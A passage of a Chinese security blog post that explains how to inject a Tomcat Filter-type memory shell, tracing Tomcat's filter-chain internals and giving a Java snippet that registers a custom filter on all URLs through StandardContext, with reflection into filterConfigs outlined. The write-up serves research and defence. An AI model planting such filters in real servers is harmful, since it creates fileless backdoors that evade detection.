+<p>然后我们找到addFilter，通过栈，我们发现每次请求<code>ApplicationFilterFactory</code>都会调用<code>ApplicationFilterChain.addFilter()</code>方法</p>
+<p><img loading="lazy" src="images/image-20241031185728210.png" alt="image-20241031185728210"  />
+</p>
+<p>这里我们往上查看</p>
+<p><img loading="lazy" src="images/image-20241031185945001.png" alt="image-20241031185945001"  />
+</p>
+<p><code>filterMaps</code>实际来自StandardContext，查看findFilterMaps方法，发现<code>filterMaps</code></p>
+<p><img loading="lazy" src="images/image-20241031190008043.png" alt="image-20241031190008043"  />
+</p>
+<p><img loading="lazy" src="images/image-20241031190100554.png" alt="image-20241031190100554"  />
+</p>
+<p>然后我们看到addFilterMap方法，这里就想到我们获得<code>StandardContext</code>实例后调用这个方法插入filter，不久行了嘛</p>
+<p><img loading="lazy" src="images/image-20241031190309711.png" alt="image-20241031190309711"  />
+</p>
+<p>但这里我们查看<code>filterMaps</code>并没有我们的<code>Filter类属性</code>，我们该怎么传入我们的<code>Filter实例</code>呢</p>
+<p><img loading="lazy" src="images/image-20241031190602043.png" alt="image-20241031190602043"  />
+</p>
+<p>然后看调用栈往上看到在调用<code>addFilterMap</code>方法前会先调用<code>addFilterDef</code>方法</p>
+<p><img loading="lazy" src="images/image-20241031190750854.png" alt="image-20241031190750854"  />
+</p>
+<p><img loading="lazy" src="images/image-20241031190909633.png" alt="image-20241031190909633"  />
+</p>
+<p>这里去FilterDef去查找一番，发现有设置Filter，那么这个地方多半是传入Filter的地方了</p>
+<p><img loading="lazy" src="images/image-20241031190845594.png" alt="image-20241031190845594"  />
+</p>
+<p>但是最后调用的<code>filterMaps</code>和<code>FilterDef</code>有什么关系呢，其实filter更像存储Filter基本信息（Filter名字，url）等，而FilterDef则储存<code>Filter名字</code>对应的<code>Filter实例</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">filterDefs.put(filterDef.getFilterName(), filterDef);
+</span></span></code></pre></div><p>这里put，第一个参数就是<code>Filter名字</code>。</p>
+<p>然后通过其他demoFilter的我们大概也知道filterMaps要设置什么值（Filter名字，url）</p>
+<p>然后尝试构造poc，最后写入filter代码长这样</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">FilterDef</span><span class="w"> </span><span class="n">filterDef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterDef</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">myFilter</span><span class="w"> </span><span class="n">myFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">myFilter</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilter</span><span class="p">(</span><span class="n">myFilter</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="s">&#34;myFilter&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">FilterMap</span><span class="w"> </span><span class="n">filterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterMap</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="s">&#34;myFilter&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterMap</span><span class="p">.</span><span class="na">addURLPattern</span><span class="p">(</span><span class="s">&#34;/*&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Standardcontext1</span><span class="p">.</span><span class="na">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Standardcontext1</span><span class="p">.</span><span class="na">addFilterMap</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>运行后，执行发现没反应，调试发现漏了一处地方</p>
+<p><img loading="lazy" src="images/image-20241031191926583.png" alt="image-20241031191926583"  />
+</p>
+<p>这里我的filterMaps已经有我自己的filterMap了，但是执行我的filterMap时进入了最后这个continue</p>
+<p>发现filterConfig没有值，起初没细看这里，以为这里是用来封装的，到filterMap构造就能成功执行。</p>
+<p>倒回来我们跟进<strong>findFilterConfig</strong>方法，然后再查看<code>filterConfigs</code>哪些地方调用过</p>
+<p><img loading="lazy" src="images/image-20241031192228133.png" alt="image-20241031192228133"  />
+</p>
+<p>查看完，发现也只有**filterStart()**方法这里进行过赋值</p>
+<p><img loading="lazy" src="images/image-20241031192437153.png" alt="image-20241031192437153"  />
+</p>
+<p>看到这，思路也清晰了，就是反射获取filterConfigs再put一个<code>ApplicationFilterConfig</code>，查看自构方法参数，然后不是public，这个构造方法也要通过反射然后实例化</p>
+<p><img loading="lazy" src="images/image-20241031192654369.png" alt="image-20241031192654369"  />
+</p>
+<p>Filter传参带有response，不用考虑获取，servletContext和Listener一样的获取方式，然后就可以完整poc啦</p>
+<p><strong>Filter 的加载流程如下</strong></p>
+<blockquote>
+<ol>
+<li>通过 ApplicationFilterFactory.createFilterChain() 创建 FilterChain</li>
+<li>调用 StandardContext.findFilterMaps() 得到 filterMaps</li>
+<li>遍历 filterMaps, 依次从 StandardContext 中用 filterMap.getFilterName() 获取对应的 filterConfig, 并将其放入 FilterChain</li>
+<li>执行 FilterChain.doFilter() 并在内部调用 internalDoFilter 方法</li>
+<li>依次执行 filterConfig.getFilter() 获取 Filter 实例, 并最终调用其 doFilter 方法</li>
+</ol>
+</blockquote>
+<p>感觉自己第一次写，有些潦草，也不想大改了（懒）</p>
+<h1 id="0x03-补充">0x03 补充<a hidden class="anchor" aria-hidden="true" href="#0x03-补充">#</a></h1>
+<p>这里补充下流程，直接借用其他大佬的图了</p>
+<blockquote>
+<p>调用栈</p>
+</blockquote>
+<p><img loading="lazy" src="images/202211042024305.png" alt="https://img.exp10it.io/img/202211042024305.png"  />
+</p>
+<p>直接跳转到 StandardWrapperValve<img loading="lazy" src="images/202211042026953.png" alt="https://img.exp10it.io/img/202211042026953.png"  />
+</p>
+<p>执行了 filterChain.doFilter 方法, 继续跟进</p>
+<p><img loading="lazy" src="images/202211042028133.png" alt="https://img.exp10it.io/img/202211042028133.png"  />
+</p>
+<p>然后我们回到 StandardWrapperValve, 往前面翻翻看这个 filterChain 是怎么来的</p>
+<p><img loading="lazy" src="images/202211042027120.png" alt="https://img.exp10it.io/img/202211042027120.png"  />
+</p>
+<p>这里通过 ApplicationFilterFactory.createFilterChain() 创建 filterChain</p>
+<p>需要注意创建过程是动态的, 即我们每发起一次请求, tomcat 都会执行一遍 createFilterChain, 这也为后面内存马的植入做了铺垫</p>
+<p>跟进 createFilterChain 方法</p>
+<p><img loading="lazy" src="images/202211042040708.png" alt="https://img.exp10it.io/img/202211042040708.png"  />
+</p>
+<p>首先从 Request 对象中获取 filterChain, 如果 filterChain 不存在, 就自己新建一个, 再设置到 req 内</p>
+<p><img loading="lazy" src="images/202211042043731.png" alt="https://img.exp10it.io/img/202211042043731.png"  />
+</p>
+<p>然后从 wrapper 中获取 StandardContext 对象, 并且调用 findFilterMaps 方法得到 filterMaps</p>
+<p><img loading="lazy" src="images/202211042045782.png" alt="https://img.exp10it.io/img/202211042045782.png"  />
+</p>
+<p>最后遍历 filterMaps, 通过 filterMap.getFilterName() 从 context 中寻找对应的 FilterConfig 并且添加至 filterChain</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>Commons-Collections1-7</span>
+  </a>
+  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-listener%E5%86%85%E5%AD%98%E9%A9%AC/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>Tomcat Listener内存马</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
